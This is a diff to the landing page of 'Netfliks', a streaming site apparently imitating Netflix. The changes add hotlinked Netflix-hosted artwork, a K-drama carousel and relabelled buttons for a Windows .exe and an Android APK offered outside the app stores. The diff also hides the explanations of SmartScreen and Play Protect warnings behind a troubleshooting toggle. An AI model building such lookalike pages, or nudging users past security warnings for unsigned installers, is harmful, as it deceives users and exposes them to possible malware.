@@ -23,6 +23,9 @@
 
 <main>
 <section class="hero">
+  <div class="hero-backdrop" aria-hidden="true">
+    <img src="https://dnm.nflximg.net/api/v6/2DuQlx0fM4wd1nzqm5BFBi6ILa8/AAAAQTSBIFw90-6pYOMxVtejMtDOfr4c_nsSRuU5BzWrnFzgPtVlDxoyI84bF4POfNcmJuZv4xjbp3fLL9rWPQjJyyPGIh1GP7gvgZIScYtIbdlIyvB8Dvx37KART3aLOd1i2LHNNvP0I-1CUQLuwWt1_y59.jpg?r=4e6" alt="">
+  </div>
   <div class="hero-orbit orbit-a"></div><div class="hero-orbit orbit-b"></div>
   <div class="hero-copy reveal">
     <div class="pill"><span class="live-dot"></span> THE NEW STREAMING EXPERIENCE</div>
@@ -51,6 +54,39 @@
     <div class="float-card fc2"><b>∞</b><span>Your library</span></div>
     <div class="float-card fc3"><b>●</b><span>Live & ready</span></div>
   </div>
+
+</section>
+
+<section class="movie-showcase reveal" id="kdrama-showcase">
+  <div class="showcase-head">
+    <div>
+      <small>NOW PLAYING</small>
+      <h2>Stories worth<br><em>staying for.</em></h2>
+    </div>
+    <span class="showcase-hint">Swipe to explore</span>
+  </div>
+  <div class="movie-carousel" aria-label="Featured movie and series artwork">
+    <article class="movie-card">
+      <img src="https://dnm.nflximg.net/api/v6/2DuQlx0fM4wd1nzqm5BFBi6ILa8/AAAAQTSBIFw90-6pYOMxVtejMtDOfr4c_nsSRuU5BzWrnFzgPtVlDxoyI84bF4POfNcmJuZv4xjbp3fLL9rWPQjJyyPGIh1GP7gvgZIScYtIbdlIyvB8Dvx37KART3aLOd1i2LHNNvP0I-1CUQLuwWt1_y59.jpg?r=4e6" alt="Alchemy of Souls still">
+      <div class="movie-card-overlay"></div>
+      <div class="movie-card-copy"><small>K-DRAMA · FANTASY</small><h3>Alchemy of Souls</h3><p>Magic, destiny and a world of changing souls.</p></div>
+    </article>
+    <article class="movie-card">
+      <img src="https://i.pinimg.com/736x/c7/7e/7d/c77e7d108628683fd5901295134bc3f3.jpg" alt="Mr. Queen still">
+      <div class="movie-card-overlay"></div>
+      <div class="movie-card-copy"><small>K-DRAMA · COMEDY</small><h3>Mr. Queen</h3><p>Royal chaos with a completely unexpected twist.</p></div>
+    </article>
+    <article class="movie-card">
+      <img src="https://ian.marieclaire.com.tw/assets/mc/202403/6600FB1DAFA651711340317.jpeg?format=jpg&t=sc&w=1200%2C675" alt="Queen of Tears still">
+      <div class="movie-card-overlay"></div>
+      <div class="movie-card-copy"><small>K-DRAMA · ROMANCE</small><h3>Queen of Tears</h3><p>Big feelings, beautiful frames and unforgettable moments.</p></div>
+    </article>
+    <article class="movie-card">
+      <img src="https://www.infobae.com/resizer/v2/VV56G5ODBBHALFCX3IMEZUS2U4.jpg?auth=a4a2b2cb1845a207d50dbf620bb07ae6ac1e256814ede9e56d58129a00ab1cae&height=512&quality=85&smart=true&width=1024" alt="My Demon still">
+      <div class="movie-card-overlay"></div>
+      <div class="movie-card-copy"><small>K-DRAMA · SUPERNATURAL</small><h3>My Demon</h3><p>A sleek supernatural romance for late-night watching.</p></div>
+    </article>
+  </div>
 </section>
 
 <section class="ticker"><div>NETFLIKS <span>✦</span> STREAM <span>✦</span> DISCOVER <span>✦</span> WATCH <span>✦</span> REPEAT <span>✦</span> NETFLIKS <span>✦</span> STREAM <span>✦</span></div></section>
@@ -70,13 +106,13 @@
     <article class="platform active">
       <div>
         <span class="platform-icon platform-logo-wrap">
-          <img class="platform-logo" src="https://cdn.simpleicons.org/microsoftwindows/ffffff" alt="Windows">
+          <span class="windows-mark" aria-hidden="true"><i></i><i></i><i></i><i></i></span>
         </span>
         <small>AVAILABLE NOW</small>
         <h3>Windows</h3>
         <p>Download the Netfliks desktop application for Windows.</p>
       </div>
-      <a id="windowsDownload" class="download-trigger" href="#">Choose download <b>↓</b></a>
+      <a id="windowsDownload" class="download-trigger" href="#">Download for Windows <b>↓</b></a>
     </article>
 
     <article class="platform active">
@@ -88,7 +124,7 @@
         <h3>Android</h3>
         <p>Install the Netfliks mobile application on your Android device.</p>
       </div>
-      <a id="androidDownload" class="android-direct" href="#">Download APK <b>↓</b></a>
+      <a id="androidDownload" class="android-direct" href="#">Download for Android <b>↓</b></a>
     </article>
 
     <article class="platform future">
@@ -119,12 +155,12 @@
   <div class="download-chooser-card" role="dialog" aria-modal="true" aria-labelledby="downloadChooserTitle">
     <button id="downloadChooserClose" class="install-guide-close" type="button" aria-label="Close">×</button>
     <div class="install-guide-kicker">CHOOSE YOUR PLATFORM</div>
-    <h2 id="downloadChooserTitle">Where are you installing Netfliks?</h2>
-    <p class="install-guide-intro">Pick the version for your device. Windows and Android are available now; iOS is coming soon.</p>
+    <h2 id="downloadChooserTitle">Choose your device</h2>
+    <p class="install-guide-intro">Choose a device and continue to the correct Netfliks download.</p>
 
     <div class="download-options">
       <button id="chooseWindows" class="download-option" type="button">
-        <span class="platform-logo-wrap"><img class="platform-logo" src="https://cdn.simpleicons.org/microsoftwindows/ffffff" alt=""></span>
+        <span class="platform-logo-wrap"><span class="windows-mark" aria-hidden="true"><i></i><i></i><i></i><i></i></span></span>
         <span class="download-option-copy"><strong>Windows</strong><small>Desktop installer · Available now</small></span>
         <span class="download-option-arrow">→</span>
       </button>
@@ -151,13 +187,11 @@
   <div class="install-guide-card" role="dialog" aria-modal="true" aria-labelledby="installGuideTitle">
     <button id="installGuideClose" class="install-guide-close" type="button" aria-label="Close">×</button>
     <div class="install-guide-kicker">BEFORE YOU INSTALL</div>
-    <h2 id="installGuideTitle">Windows may show a security warning.</h2>
-    <p class="install-guide-intro">
-      Netfliks is a new Windows app and may not yet have an established Microsoft Defender SmartScreen reputation.
-      That warning does <strong>not by itself mean the app is malicious</strong>.
-    </p>
+    <h2 id="installGuideTitle">Ready to install Netfliks for Windows?</h2>
+    <p class="install-guide-intro">Download <strong>NetfliksSetup.exe</strong> from the button below. If Windows shows a security prompt during installation, use the troubleshooting steps only when needed.</p>
 
-    <div class="install-guide-steps">
+    <button id="windowsTroubleToggle" class="install-guide-trouble" type="button" aria-expanded="false">Experiencing issues? <span>Show solutions</span></button>
+    <div id="windowsInstallHelp" class="install-guide-steps help-steps" hidden>
       <div class="install-step">
         <span>01</span>
         <div>
@@ -180,7 +214,6 @@
         </div>
       </div>
     </div>
-
     <div class="install-guide-note">
       <span>ⓘ</span>
       <p>SmartScreen can warn about new or infrequently downloaded apps while reputation is being established. Keep Windows security enabled.</p>
@@ -199,13 +232,11 @@
   <div class="install-guide-card" role="dialog" aria-modal="true" aria-labelledby="androidInstallGuideTitle">
     <button id="androidInstallGuideClose" class="install-guide-close" type="button" aria-label="Close">×</button>
     <div class="install-guide-kicker">BEFORE YOU INSTALL</div>
-    <h2 id="androidInstallGuideTitle">Android may show a Play Protect warning.</h2>
-    <p class="install-guide-intro">
-      Netfliks is being installed directly from the official Netfliks website rather than Google Play, so Google Play Protect may warn you about the APK.
-      Check that you downloaded it from this official website and that the file is <strong>Netfliks-Android.apk</strong>.
-    </p>
+    <h2 id="androidInstallGuideTitle">Ready to install Netfliks for Android?</h2>
+    <p class="install-guide-intro">Download <strong>Netfliks-Android.apk</strong> from the button below. If Android blocks the APK, use the troubleshooting steps only when needed.</p>
 
-    <div class="install-guide-steps">
+    <button id="androidTroubleToggle" class="install-guide-trouble" type="button" aria-expanded="false">Experiencing issues? <span>Show solutions</span></button>
+    <div id="androidInstallHelp" class="install-guide-steps help-steps" hidden>
       <div class="install-step">
         <span>01</span>
         <div>
@@ -235,7 +266,6 @@
         </div>
       </div>
     </div>
-
     <div class="install-guide-note">
       <span>ⓘ</span>
       <p>Android can check apps installed outside Google Play for potentially harmful behavior. Only continue when you trust the download source and have verified that you downloaded the official Netfliks APK.</p>
